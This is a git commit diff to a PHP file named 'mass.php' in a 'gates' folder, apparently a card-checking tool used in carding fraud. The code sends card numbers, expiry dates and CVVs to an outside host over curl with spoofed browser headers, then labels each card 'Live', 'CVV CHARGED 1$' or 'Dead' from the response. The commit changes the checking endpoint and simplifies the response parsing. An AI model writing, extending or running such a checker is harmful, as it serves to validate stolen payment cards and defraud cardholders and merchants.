54ad985404358b653431e1ba2d63f6b3030c72ae
sanji0310 <cardbygloosmoke@gmail.com>
2024-06-17 01:28:35 +0700

    Update mass.php

--- gates/mass.php
+++ gates/mass.php
@@ -47,9 +47,8 @@ $mes = $separa[1];
 $ano = $separa[2];
 $cvv = $separa[3];
 
-
 $ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, 'https://waa.emmailfnen235.repl.co/api.php?lista='.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'');
+curl_setopt($ch, CURLOPT_URL, 'https://lista-production-9b29.up.railway.app/chk.php?lista='.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'');
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
@@ -60,18 +59,15 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
     curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-'authority: replit.com',
-'method: GET',
-'path: api.php?lista='.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'',
-'scheme: https',
+'GET /chk.php?lista='.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.' h2',
+'Host: lista-production-9b29.up.railway.app',
+'user-agent: Mozilla/5.0 (Linux; Android 12; M2003J15SC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36',
 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+'sec-fetch-site: none',
+'sec-fetch-mode: navigate',
+'sec-fetch-user: ?1',
+'sec-fetch-dest: document',
 'accept-language: en-US,en;q=0.9',
-'content-type: ',
-'cookie: ',
-'sec-fetch-dest: empty',
-'sec-fetch-mode: cors',
-'sec-fetch-site: same-origin',
-'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
   ));
 
 # ----------------- [2req Postfields] ---------------------#
@@ -87,111 +83,40 @@ if ((strpos($result2a, 'incorrect_zip')) || (strpos($result2a, 'Your card zip co
       $response = "Zip Mismatch ❎";
     }
 
-
-elseif (strpos($result2a, "CVV LIVE")){
-  $status = "Live 🟢";
-$response = "CVV Matched ✅";
-  }
-elseif ((strpos($result2a, "INSUFFICIENT FUNDS")) || (strpos($result2a, "insufficient_funds"))){
+elseif ((strpos($result2a, "INSUFFICIENT FUNDS")) || (strpos($result2a, "insufficient funds"))){
   $status = "CVV Live 🟢";
 $response = "INSUFFICIENT FUNDS ✅";
 
   }
-elseif ((strpos($result2a, "CCN LIVE")) || (strpos($result2a, "incorrect_cvc")) || (strpos($result2a, "The card's security code is incorrect."))){
+elseif ((strpos($result2a, "CCN LIVE")) || (strpos($result2a, "security code is invalid")) || (strpos($result2a, "security code is incorrect"))){
   $status = "Live 🟡";
-$response = "CCN Live ❎";
+$response = "CCN LIVE ✅";
 
   }
-elseif ((strpos($result2a, "TRANSACTION NOT ALLOWED")) || (strpos($result2a, "transaction_not_allowed"))){
-  $status = "Live 🟡";
-$response = "TRANSACTION NOT ALLOWED";
-
-  }
-
-elseif (strpos($result2a, "DO NOT HONOR")){
-  
-$status = "Dead 🔴";
-$response = "DO NOT HONOR 🚫";
-}
-
-elseif (strpos($result2a, "stolen_card")){
-  
-$status = "Dead 🔴";
-$response = "Stolen Card 🚫";
-}
-
-elseif (strpos($result2a, "lost_card")){
-  $status = "Dead 🔴";
-$response = "Lost Card 🚫";
-}
-
-
-elseif (strpos($result2a, "PICKUP CARD")){
-  $status = "Dead 🔴";
-$response = "PICKUP CARD";
-}
-
 
 elseif ((strpos($result2a, 'INCORRECT CARD NUMBER')) || (strpos($result2a, 'Your card number is incorrect.')) || (strpos($result2a, 'incorrect_number'))){
   
   $status = "Dead 🔴";
-$response = "Incorrect Card Number 🚫";
+$response = "INCORRECT NUMBER ⭕";
 }
 
 
 elseif ((strpos($result2a, 'Your card has expired.')) || (strpos($result2a, 'expired_card'))){
   $status = "Dead 🔴";
-$response = "Expired Card 🚫";
+$response = "EXPIRED CARD ⭕";
 
   }
 
 
-elseif (strpos($result2a, '"status":"success"')){
+elseif (strpos($result2a, '"Thank you for your Payment.')){
   $status = "Live 🟢";
-$response = "Charged 1$";
+$response = "CVV CHARGED 1$ 🔥";
 
   }
-
-
-elseif (strpos($result2a, "FRAUDULENT")){
-  $status = "Dead 🔴";
-$response = "Fraudulent 🚫";
-}
-
-
-elseif (strpos($result2a, "lock_timeout")){
-  $status = "Dead 🔴";
-$response = "error 404 🚫";
-}
-
 
 elseif ((strpos($result2a, "Your card was declined.")) || (strpos($result2a, 'The card was declined.'))){
   $status = "Dead 🔴";
-$response = "Generic Decline 🚫";
-}
-
-
-elseif (strpos($result2a, "NVAILD EXPIRY MONTH")){
-  $status = "Dead 🔴";
-$response = "NVAILD EXPIRY MONTH 😥";
-}
-
-
-
-elseif (strpos($result2a, "Error processing payment")){
-  $status = "Dead 🔴";
-$response = "Error processing payment";
-}
-
-elseif (strpos($result2a, 'CARD NOT SUPPORTED')){
-  $status = "Live 🟡";
-$response = "CARD NOT SUPPORTED 🚫";
-}
-
-
-elseif (strpos($result2a, "parameter_invalid_empty")){
-  $status = "Dead 🔴";
-$response = "404 error 🚫";
+$response = "GENERIC DECLINED 🚫";
 }
 
 else {
